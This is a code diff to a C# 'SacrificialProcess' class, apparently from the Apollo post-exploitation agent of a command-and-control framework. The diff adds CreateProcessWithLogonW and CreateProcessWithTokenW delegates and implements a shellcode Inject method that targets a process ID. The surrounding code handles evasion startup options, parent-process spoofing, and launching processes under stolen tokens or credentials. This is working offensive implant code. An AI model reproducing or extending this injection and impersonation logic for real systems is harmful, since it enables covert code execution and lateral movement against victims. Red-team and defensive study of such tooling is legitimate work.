@@ -1,4 +1,5 @@
 ﻿using ApolloInterop.Classes.Api;
+using ApolloInterop.Classes.Core;
 using ApolloInterop.Classes.Events;
 using ApolloInterop.Interfaces;
 using ApolloInterop.Structs.ApolloStructs;
@@ -16,10 +17,17 @@ using static ApolloInterop.Enums.Win32;
 using static ApolloInterop.Structs.Win32;
 using AI = ApolloInterop.Classes.Core;
 
-namespace Apollo.Api.ApolloProcess
+namespace Process
 {
     public class SacrificialProcess : AI.Process
     {
+        [Flags]
+        public enum LogonFlags
+        {
+            NONE = 0x00000000,
+            LOGON_WITH_PROFILE = 0x00000001,
+            LOGON_NETCREDENTIALS_ONLY = 0x00000002
+        }
         private const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
         private const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
         private const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
@@ -66,6 +74,28 @@ namespace Apollo.Api.ApolloProcess
             ref StartupInfoEx lpStartupInfo,
             out ProcessInformation lpProcessInformation
         );
+        private delegate bool CreateProcessWithLogonW(
+            string lpUsername,
+            string lpDomain,
+            string lpPassword,
+            LogonFlags dwLogonFlags,
+            string lpApplicationName,
+            string lpCommandLine,
+            CreateProcessFlags dwCreationFlags,
+            IntPtr lpEnvironment,
+            string lpCurrentDirectory,
+            [In] ref StartupInfoEx lpStartupInfo,
+            out ProcessInformation lpProcessInformation);
+        private delegate bool CreateProcessWithTokenW(
+            IntPtr hToken,
+            LogonFlags dwLogonFlags,
+            string lpApplicationName,
+            string lpCommandLine,
+            CreateProcessFlags dwCreationFlags,
+            IntPtr lpEnvironment,
+            string lpCurrentDirectory,
+            [In] ref StartupInfoEx lpStartupInfo,
+            out ProcessInformation lpProcessInformation);
 
         // Kernel32
         private delegate bool CreatePipe(out SafeFileHandle phReadPipe, out SafeFileHandle phWritePipe, SecurityAttributes lpPipeAttributes, uint nSize);
@@ -137,6 +167,8 @@ namespace Apollo.Api.ApolloProcess
         private WaitForSingleObject _pWaitForSingleObject;
         private GetExitCodeProcess _pGetExitCodeProcess;
         private LogonUser _pLogonUser;
+        private CreateProcessWithLogonW _pCreateProcessWithLogonW;
+        private CreateProcessWithTokenW _pCreateProcessWithTokenW;
         #endregion
 
         public SacrificialProcess(
@@ -148,6 +180,9 @@ namespace Apollo.Api.ApolloProcess
             _pInitializeSecurityDescriptor = _agent.GetApi().GetLibraryFunction<InitializeSecurityDescriptor>(Library.ADVAPI32, "InitializeSecurityDescriptor");
             _pSetSecurityDescriptorDacl = _agent.GetApi().GetLibraryFunction<SetSecurityDescriptorDacl>(Library.ADVAPI32, "SetSecurityDescriptorDacl");
             _pLogonUser = _agent.GetApi().GetLibraryFunction<LogonUser>(Library.ADVAPI32, "LogonUser");
+            _pCreateProcessAsUser = _agent.GetApi().GetLibraryFunction<CreateProcessAsUser>(Library.ADVAPI32, "CreateProcessAsUser");
+            _pCreateProcessWithLogonW = _agent.GetApi().GetLibraryFunction<CreateProcessWithLogonW>(Library.ADVAPI32, "CreateProcessWithLogonW");
+            _pCreateProcessWithTokenW = _agent.GetApi().GetLibraryFunction<CreateProcessWithTokenW>(Library.ADVAPI32, "CreateProcessWithTokenW");
 
             _pCreateProcessA = _agent.GetApi().GetLibraryFunction<CreateProcessA>(Library.KERNEL32, "CreateProcessA");
             _pCreatePipe = _agent.GetApi().GetLibraryFunction<CreatePipe>(Library.KERNEL32, "CreatePipe");
@@ -174,7 +209,8 @@ namespace Apollo.Api.ApolloProcess
             if (!_pGetExitCodeProcess(Handle, out dwExit))
             {
                 ExitCode = 0;
-            } else
+            }
+            else
             {
                 ExitCode = dwExit;
             }
@@ -341,8 +377,8 @@ namespace Apollo.Api.ApolloProcess
 
         private ApplicationStartupInfo GetSafeStartupArgs()
         {
-            var evasionArgs = ProcessConfig.GetApplicationStartupInfo();
-
+            var evasionArgs = _agent.GetProcessManager().GetStartupInfo();
+            
             // bad things happen if you're medium integrity and do ppid spoofing while under the effects of make_token
             if (_agent.GetIdentityManager().GetOriginal() != _agent.GetIdentityManager().GetCurrentImpersonationIdentity())
             {
@@ -387,14 +423,27 @@ namespace Apollo.Api.ApolloProcess
             return bRet;
         }
 
-        public override IEnumerable<string> GetOutput()
-        {
-            throw new NotImplementedException();
-        }
-
         public override bool Inject(byte[] code, string arguments = "")
         {
-            throw new NotImplementedException();
+            bool bRet = false;
+            if (Handle == IntPtr.Zero)
+            {
+                return bRet;
+            }
+            if (HasExited)
+            {
+                return bRet;
+            }
+            try
+            {
+                var technique = _agent.GetInjectionManager().CreateInstance(code, (int)PID);
+                bRet = technique.Inject(arguments);
+            }
+            catch (Exception ex)
+            {
+                bRet = false;
+            }
+            return bRet;
         }
 
         public override bool Start()
@@ -542,7 +591,8 @@ namespace Apollo.Api.ApolloProcess
             if (!bRet)
             {
                 return bRet;
-            } else
+            }
+            else
             {
                 Exit += (object sender, EventArgs e) =>
                 {
@@ -562,7 +612,8 @@ namespace Apollo.Api.ApolloProcess
             if (!bRet)
             {
                 return bRet;
-            } else
+            }
+            else
             {
                 bRet = _pCreateProcessAsUser(
                     hToken,
@@ -582,7 +633,7 @@ namespace Apollo.Api.ApolloProcess
                 {
                     bRet = _pCreateProcessWithTokenW(
                         hToken,
-                        0x00000002, // LOGON_NET_CREDENTIALS_ONLY
+                        LogonFlags.LOGON_NETCREDENTIALS_ONLY, // LOGON_NET_CREDENTIALS_ONLY
                         null,
                         CommandLine,
                         _processFlags,
@@ -601,7 +652,7 @@ namespace Apollo.Api.ApolloProcess
                                 cred.Username,
                                 cred.Domain,
                                 cred.Password,
-                                0x00000002,
+                                LogonFlags.LOGON_NETCREDENTIALS_ONLY,
                                 null,
                                 CommandLine,
                                 _processFlags,
@@ -632,7 +683,8 @@ namespace Apollo.Api.ApolloProcess
             {
                 var proc = System.Diagnostics.Process.GetProcessById((int)PID);
                 proc.Kill();
-            } catch { }
+            }
+            catch { }
         }
 
         public override void WaitForExit()
